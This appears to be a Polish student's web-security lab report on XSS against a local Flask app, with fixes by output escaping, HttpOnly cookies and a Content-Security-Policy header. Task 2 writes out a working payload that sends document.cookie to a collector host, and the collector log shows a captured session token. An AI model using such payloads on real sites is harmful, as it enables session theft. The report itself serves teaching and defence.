### Zadanie 1:

* **Adres z ładunkiem:**
  `http://127.0.0.1:8080/szukaj?q=%3Cscript%3Edocument.body.style.backgroundColor%3D%27red%27%3B%3C%2Fscript%3E`
* **Numer wiersza: 35**
    `fraza = request.args.get("q", "")
    poprawione na:
    fraza = escape(request.args.get("q", ""))`
* **Przed poprawką:**
    `<!doctype html><meta charset='utf-8'><title>Szukaj</title><h1>Wyniki wyszukiwania dla: <script>document.body.style.backgroundColor='red';</script></h1><ul></ul><p><a href='/'>Powrót</a></p>`
* **Po poprawce:**
    `<!doctype html><meta charset='utf-8'><title>Szukaj</title><h1>Wyniki wyszukiwania dla: &lt;script&gt;document.body.style.backgroundColor=&#x27;red&#x27;;&lt;/script&gt;</h1><ul></ul><p><a href='/'>Powrót</a></p>`
* **Wyjaśnienie:**
  Kodowanie wyjścia zamienia znaki sterujące na encje, uniemożliwiając przeglądarce interpretację danych użytkownika jako kodu. Proste usuwanie słowa "script" jest łatwe do obejścia za pomocą wielkości liter lub zagnieżdżenia.


### Zadanie 2:

* **Treść ładunku:**
  `<script>new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie);</script>`
* **Wpis zbieracza przed zmianą:**
  `zbieracz-1  | ZEBRANO: /?c=session=eyJ1enl0a293bmlrIjoiYW5uYSJ9.avb35w.xQF4pzZD5j2VsTCu9mj1pRt_Z8Y`
* **Wpis zbieracza po zmianie:**
  `zbieracz-1  | ZEBRANO: /?c=`
* **Wynik kroku 3:**
```
    HTTP/1.1 200 OK
    Server: Werkzeug/3.1.9 Python/3.12.16
    Date: Fri, 13 Nov 2026 11:52:50 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 481
    Vary: Cookie
    Connection: close

    <!doctype html>
    <html lang="pl">
    <head><meta charset="utf-8"><title>Notatka</title>
    <link rel="stylesheet" href="/static/styl.css"></head>
    <body>
    <nav><a href="/">Tablica</a> | <a href="/szukaj?q=">Szukaj</a> | <a href="/podglad">Podgląd</a> |
    <a href="/notatka">Moja notatka</a> | <a href="/logowanie">Logowanie</a> | <a href="/wyloguj">Wyloguj</a></nav>

    <h1>Notatka użytkownika anna</h1>
    <p>Prywatna notatka Anny: kod do szafki w pracowni 4721 (fikcyjny).</p>

    </body>
    </html>
```
* **Przed zmianą:**
`Set-Cookie: session=eyJ1enl0a293bml...; Path=/`
* **Po zmianie:**
`Set-Cookie: session=eyJ1enl0a293bml...; HttpOnly; Path=/`
* **Wyjaśnienie:**
  `HttpOnly blokuje tylko dostęp skryptów do document.cookie, ale nie wpływa na podatność na wstrzykiwanie kodu, co pozwala na dalsze wykonywanie nieautoryzowanych akcji czy modyfikację DOM.`


### Zadanie 3:
* **Wyniki trzech ładunków:**

```
Odbity: ładunek wyświetla się jako zwykły tekst.

Zapisany: tagi <script> są wyświetlane jako tekst na stronie, brak komunikacji ze zbieraczem.

DOM: tekst po # pojawia się dosłownie na stronie, tytuł karty się nie zmienia.
```
* **CSP:**
```
PS C:\Users\kajet\Programming\lab6\pliki-dla-studentow>     curl -i http://127.0.0.1:8080/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Fri, 13 Nov 2026 12:12:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 587
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
Vary: Cookie
Connection: close
```
* **Wynik:**
`student: Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'`
* **Wyjaśnienie:**
`CSP działa jako zabezpieczenie redukujące skutki ataku w przypadku przeoczenia luki, ale nie eliminuje samego błędu i może zostać osłabione błędną konfiguracją reguł lub podatnościami w dozwolonych skryptach.`